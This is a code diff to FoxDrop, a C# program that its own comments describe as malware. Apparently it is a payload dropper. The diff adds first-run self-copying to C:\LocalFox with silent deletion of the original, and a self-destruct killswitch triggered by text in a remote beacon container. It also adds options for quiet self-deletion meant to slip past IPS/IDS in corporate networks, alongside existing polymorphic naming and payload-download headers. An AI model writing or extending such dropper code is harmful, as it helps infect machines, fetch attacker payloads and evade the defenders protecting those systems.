@@ -14,7 +14,7 @@ namespace FoxDrop
             Console.WriteLine("[╒═■] Build Information: ");
             Console.WriteLine("[├] Assembly Info: " + Assembly.GetExecutingAssembly().FullName);
             Console.WriteLine("[├] Execution Path: " + Assembly.GetExecutingAssembly().Location);
-            Console.WriteLine("[└] Polymorphic Seed: " + Hashing.CalculateFileMD5(Assembly.GetExecutingAssembly().Location));
+            Console.WriteLine("[└] Polymorphic Seed: " + HashingAndCipher.CalculateFileMD5(Assembly.GetExecutingAssembly().Location));
 
             Console.WriteLine("\n[*] Performing Checks... ");
             if (!IS_POLYMORPHISM_ENABLED)
@@ -63,17 +63,28 @@ namespace FoxDrop
         // Very useful miscellaneous variable to check if malware was executed on system before.
         public static bool IS_FIRST_EXECUTION_ON_SYSTEM = true; // Assumes its 1st execution by default.
 
+        // If this value is set to true, the first time FoxDrop executes, it will auto-copy & execute itself in the path indicated below
+        // NOTE: After auto-copying and executing the new-location's FoxDrop, the original one will SILENTLY destruct itself.
+        public static bool FIRST_EXECUTION_AUTOCOPY = false; // Default: false
+        public static string FIRST_EXECUTION_AUTOCOPY_PATH = @"C:\LocalFox"; // The folder is created if it doesn't exist.
+
         // Custom request headers when sending the GET request to the download container & for downloading payloads (possibly use for auth)
         public static string[] BEACON_CONTAINER_REQUEST_AND_DOWNLOAD_HEADERS =
             { "Example-Access-Code: 81102731" }; // Leave empty for no extra headers.
 
+        // If this text is found in the download container text, the program auto deletes itself from the system.
+        public static string BEACON_DOWNLOAD_CONTAINER_SELFDESTRUCT_KILLSWITCH = "c5f366a3";
+
+        // If silent destruction is enabled, FoxDrop will delete itself as silently as possible, better for IPS/IDS & corporate envs.
+        // If the destruction is not silent, FoxDrop will delete itself better but WAY noisier (works only with ADMIN privs)
+        public static bool SILENT_DESTRUCTION = false; // Default: true
 
         // ##¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯## //
         // ### Execution Policies and Data. ### //
         // ##________________________________## //
 
         // Generate a build-dependant polymorphic or static key name.
-        public static string registryFolderName = IS_POLYMORPHISM_ENABLED ? Hashing.CalculateFileMD5(Assembly.GetExecutingAssembly().Location) : STATIC_NAME;
+        public static string registryFolderName = IS_POLYMORPHISM_ENABLED ? HashingAndCipher.CalculateFileMD5(Assembly.GetExecutingAssembly().Location) : STATIC_NAME;
 
         // # Beacon key name, used to manage downloads.
         public static string beaconKeyName = registryFolderName.Substring(0, Math.Min(3, registryFolderName.Length)).ToUpper();
